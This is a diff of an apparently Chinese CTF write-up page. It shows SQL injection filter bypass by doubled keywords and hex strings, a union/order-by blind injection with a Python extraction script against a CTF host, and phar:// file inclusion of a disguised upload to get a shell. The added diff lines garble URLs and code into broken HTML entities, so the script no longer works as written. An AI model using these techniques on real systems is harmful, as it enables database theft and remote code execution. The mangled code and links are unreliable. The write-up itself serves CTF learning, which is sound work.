@@ -446,14 +446,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
-                        1.5k
+                        1.6k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>Read Times:&nbsp;&nbsp;
-                        5 Min
+                        6 Min
                     </div>
                     
                 
@@ -475,7 +475,7 @@
 <p>既然文件能下载，那么数据库应该就是存了文件路径，通过查询返回路径进行下载。既然是查数据库就存在注入，当务之急是获取一下源码，那如果查询结果是源码路径，那不就能获取源码了？</p>
 <p>但是这个注入还有过滤，并且怎么注都没有回显，很坑，最后看wp发现是关键字替换为空（就算我知道是关键字替换我还不知道是哪些被替换了，着实坑爹），双写绕过，拿到一堆源码，可以看见过滤是怎么过滤的了</p>
 <h3 id="坑点1"><a href="#坑点1" class="headerlink" title="坑点1"></a>坑点1</h3><p>这里注入的时候本来想直接用引号包裹文件名获取，还是不行，后来看wp用0x十六进制数来获取的源码，看到源码之后发现在index.php的开头调用了一个自定义的转义函数，把引号什么的进行了转义，但是这个转义好像转的直接不能正常运行了，理论上转义也只是把引号变成引号字符才对</p>
-<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>文件包含被添加了固定的.php后缀，并且限制了.. php: 的伪协议和空白字符（不知道空白字符有什么用）<br>对于限制特定后缀的文件包含可以使用phar://协议或者zip://协议绕过，将后缀为.php的文件打包上传，这样子包含自己的打包文件中的php文件即可绕过<br><a href="https://bl4ck.in/tricks/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html" target="_blank" rel="noopener">https://bl4ck.in/tricks/2015/06/10/zip%E6%88%96phar%E5%8D%8F%E8%AE%AE%E5%8C%85%E5%90%AB%E6%96%87%E4%BB%B6.html</a></p>
+<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>文件包含被添加了固定的.php后缀，并且限制了.. php: 的伪协议和空白字符（不知道空白字符有什么用）<br>对于限制特定后缀的文件包含可以使用phar://协议或者zip://协议绕过，将后缀为.php的文件打包上传，这样子包含自己的打包文件中的php文件即可绕过<br><a href="https://bl4ck.in/tricks/2015/06/10/zip&amp;#37E6&amp;#3788&amp;#3796phar&amp;#37E5&amp;#378D&amp;#378F&amp;#37E8&amp;#37AE&amp;#37AE&amp;#37E5&amp;#378C&amp;#3785&amp;#37E5&amp;#3790&amp;#37AB&amp;#37E6&amp;#3796&amp;#3787&amp;#37E4&amp;#37BB&amp;#37B6.html" target="_blank" rel="noopener">https://bl4ck.in/tricks/2015/06/10/zip&amp;#37E6&amp;#3788&amp;#3796phar&amp;#37E5&amp;#378D&amp;#378F&amp;#37E8&amp;#37AE&amp;#37AE&amp;#37E5&amp;#378C&amp;#3785&amp;#37E5&amp;#3790&amp;#37AB&amp;#37E6&amp;#3796&amp;#3787&amp;#37E4&amp;#37BB&amp;#37B6.html</a></p>
 <h3 id="union盲注"><a href="#union盲注" class="headerlink" title="union盲注"></a>union盲注</h3><p>全新的知识点<br>但是这次的文件上传没有返回文件名，从源码中可以看到文件名被替换为了一个32位随机字符串，这样子硬撞是没希望了，所以我们就要看怎么通过注入来获取文件名<br>这里注入没有报错，只有一个查询不到结果时的回显和查询的结果文件不存在的回显<br>再看注入的过滤，这里把括号()给替换为空了，就等于不能使用函数，还有一些其他的符号也不能使用，这样子bool盲注时间盲注都没机会了<br>union查询会返回union查询的结果，按照常规顺序的话返回的行按查询顺序排序，如果使用order by，则会以ascii码顺序进行排序，比如这里我们使用<code>select location from download where id=2 union select 0xxxxxx order by 1</code>（使用十六进制表示是因为引号用了会出问题）<br>这样的语句，那么如果我后面的这个0xxxxx的字符串ascii码小于前面语句查询出来的结果，order by就会把union查询的结果作为第一行返回，我令ascii码递增，当我的ascii码大于前面的查询时，就会查询出正确结果，那么就可知上一次查询的结果应当与真实结果相匹配，这样子就可以一位位的试出来内容<br>注入原理如下</p>
 <pre class=" language-mysql"><code class="language-mysql">mysql> select username from users where id=1 union select 'Da' order by 1;
 +----------+
@@ -505,14 +505,14 @@ mysql> select username from users where id=1 union select 'Dz' order by 1;
     <span class="token keyword">return</span> result
 
 
-str_pool <span class="token operator">=</span> <span class="token string">"123456789abcdefghijklmnopqrstuvwxyz{"</span>   <span class="token comment" spellcheck="true"># z后面的字符ascii码值要比z大，不然z下一步又遇到一个小的就无法判断了</span>
+str_pool <span class="token operator">=</span> <span class="token string">"123456789abcdefghijklmnopqrstuvwxyz&amp;#123"</span>   # z后面的字符ascii码值要比z大，不然z下一步又遇到一个小的就无法判断了
 url <span class="token operator">=</span> <span class="token string">"http://0f8def7f-c0bd-4db5-a818-bcaae8ee52a8.node3.buuoj.cn/downfile.php"</span>
 file_name <span class="token operator">=</span> <span class="token string">"./Up10aDs/"</span>
-headers <span class="token operator">=</span> <span class="token punctuation">{</span>
+headers <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123</span>
     <span class="token string">"Content-Type"</span><span class="token punctuation">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">,</span>
     <span class="token string">"Cookie"</span><span class="token punctuation">:</span>  <span class="token string">"_ga=GA1.2.231385534.1582877428; PHPSESSID=ei99gqi0lpr7lrsn8ihsquki12"</span><span class="token punctuation">,</span>
-<span class="token punctuation">}</span>
-payload <span class="token operator">=</span> <span class="token string">"image=3 uniunionon seleselectct 0x{0} oorrder by 1&amp;image_download=%E6%94%B6%E8%97%8F"</span>
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125</span>
+payload <span class="token operator">=</span> <span class="token string">"image=3 uniunionon seleselectct 0x&amp;#1230&amp;#125 oorrder by 1&amp;image_download=&amp;#37E6&amp;#3794&amp;#37B6&amp;#37E8&amp;#3797&amp;#378F"</span>
 
 <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]filename:"</span> <span class="token operator">+</span> file_name<span class="token punctuation">)</span>
@@ -528,7 +528,7 @@ payload <span class="token operator">=</span> <span class="token string">"image=
             file_name <span class="token operator">+=</span> str_pool<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span>
             <span class="token keyword">break</span></code></pre>
 <p>这里源码中产生的随机字符串只要0-9a-z，所以字符池中也只有这么多位</p>
-<p>最后我创建了一个1.phar改名成1.png上传，里面打包了一个z3ratu1.php，最后查到路径进行包含，phar://Up10aDs/path.png/z3ratu1 这样子就会把后面的后缀补齐，再用phar协议解压缩成功包含了<br><a href="http://wonderkun.cc/2017/02/26/%E5%9F%BA%E4%BA%8Eunion%E6%9F%A5%E8%AF%A2%E7%9A%84%E7%9B%B2%E6%B3%A8(%E6%84%9F%E8%B0%A2pcat%E7%89%9B%E4%B8%8D%E5%90%9D%E8%B5%90%E6%95%99)/" target="_blank" rel="noopener">http://wonderkun.cc/2017/02/26/%E5%9F%BA%E4%BA%8Eunion%E6%9F%A5%E8%AF%A2%E7%9A%84%E7%9B%B2%E6%B3%A8(%E6%84%9F%E8%B0%A2pcat%E7%89%9B%E4%B8%8D%E5%90%9D%E8%B5%90%E6%95%99)/</a></p>
+<p>最后我创建了一个1.phar改名成1.png上传，里面打包了一个z3ratu1.php，最后查到路径进行包含，phar://Up10aDs/path.png/z3ratu1 这样子就会把后面的后缀补齐，再用phar协议解压缩成功包含了<br><a href="http://wonderkun.cc/2017/02/26/&amp;#37E5&amp;#379F&amp;#37BA&amp;#37E4&amp;#37BA&amp;#378Eunion&amp;#37E6&amp;#379F&amp;#37A5&amp;#37E8&amp;#37AF&amp;#37A2&amp;#37E7&amp;#379A&amp;#3784&amp;#37E7&amp;#379B&amp;#37B2&amp;#37E6&amp;#37B3&amp;#37A8(&amp;#37E6&amp;#3784&amp;#379F&amp;#37E8&amp;#37B0&amp;#37A2pcat&amp;#37E7&amp;#3789&amp;#379B&amp;#37E4&amp;#37B8&amp;#378D&amp;#37E5&amp;#3790&amp;#379D&amp;#37E8&amp;#37B5&amp;#3790&amp;#37E6&amp;#3795&amp;#3799)/" target="_blank" rel="noopener">http://wonderkun.cc/2017/02/26/&amp;#37E5&amp;#379F&amp;#37BA&amp;#37E4&amp;#37BA&amp;#378Eunion&amp;#37E6&amp;#379F&amp;#37A5&amp;#37E8&amp;#37AF&amp;#37A2&amp;#37E7&amp;#379A&amp;#3784&amp;#37E7&amp;#379B&amp;#37B2&amp;#37E6&amp;#37B3&amp;#37A8(&amp;#37E6&amp;#3784&amp;#379F&amp;#37E8&amp;#37B0&amp;#37A2pcat&amp;#37E7&amp;#3789&amp;#379B&amp;#37E4&amp;#37B8&amp;#378D&amp;#37E5&amp;#3790&amp;#379D&amp;#37E8&amp;#37B5&amp;#3790&amp;#37E6&amp;#3795&amp;#3799)/</a></p>
 <h3 id="小坑"><a href="#小坑" class="headerlink" title="小坑"></a>小坑</h3><p>写到最后又忘了之前他给了一个引号的转义，最后getshell的时候执行phpinfo没什么问题，但是想执行函数带了几个引号就没反应了，我还以为有什么奇奇怪怪的问题，最后还是马师傅厉害，几分钟就测出来结果了，事实上执行函数不带引号问题也不大，大部分就报个警告然后当成字符串执行了<br>所以出了问题还是要思考是不是环境有过滤嘛</p>
 
             </div>
@@ -951,7 +951,7 @@ Mark loves cat被戏耍了，完全是一个动脑题，输在愚钝上
         <div class="col s12 m8 l8 copy-right">
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">44.6k</span>&nbsp;字
+                class="white-color">46.1k</span>&nbsp;字
             
             
             
